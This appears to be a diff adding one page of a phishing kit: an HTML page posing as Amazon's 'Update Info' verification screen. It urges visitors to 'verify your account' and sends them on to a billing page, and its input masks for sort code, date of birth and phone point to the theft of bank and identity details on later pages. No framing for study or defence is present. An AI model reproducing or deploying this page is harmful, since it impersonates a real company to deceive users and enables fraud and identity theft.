@@ -1,0 +1,55 @@
+<html><head>
+    <title>Amazon - Update Info</title>
+    <link rel="icon" href="../assets/img/amazon.png">
+    <link rel="stylesheet" href="../assets/css/mobile_login.css">
+    <link rel="stylesheet" href="../assets/css/billing.css">
+    <script type="text/javascript" src="../assets/js/jquery-1.9.1.js"></script>
+    <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
+    <script type="text/javascript" src="../assets/js/jquery.payment.js"></script>
+    <script type="text/javascript" src="../assets/js/additional-methods.min.js"></script>
+    <script type="text/javascript" src="../assets/js/jquery.maskedinput.js"></script>
+    <script type="text/javascript" src="../assets/js/validate.php"></script>
+    <script type="text/javascript" src="../assets/js/validation.js"></script>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+    </head>
+    <body>
+      <script>
+      $(document).ready(function(){
+      var bith = "dd/mm/yyyy";
+      $("#sortcode").mask("99-99-99",{placeholder:"__-__-__"});
+      $('input[name="dob"]').mask("99/99/9999", {placeholder: bith });
+      $('input[name="phone"]').keyup(function(e) {
+          if (/\D/g.test(this.value))
+          {
+            this.value = this.value.replace(/\D/g, '');
+          }
+        });
+      });
+      </script>
+        <center>
+     <br><header style="background-color:#fff;">
+      <div class="hleft">
+      <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
+        height: 31px;
+        width: 103px;" role="img" aria-label="Amazon"></i>
+      </div>
+      </header>  </center><center>
+      <br><div style="width:400px;" class="boxlogin"><div id="warnings" style="font-size:12px;font-family: Arial,sans-serif;">
+    <h1>Verification</h1>
+    <span style="font-size:15px;font-family: Arial,sans-serif;">You need to verify your account and complete the information that has been printed on your account when you first registered/last payment.</span>
+    <br>
+    <br><br>
+     </div>
+    
+    <div id="formbilling">
+    <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+    <a style="text-decoration: none;" href="billing.html">
+    <input type="submit" id="submit_cc" class="button a-button-text" style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value="Continue"></a>
+    </div></div>
+    </div>
+    
+    </center>
+    <br><br>
+    
+    </body></html>
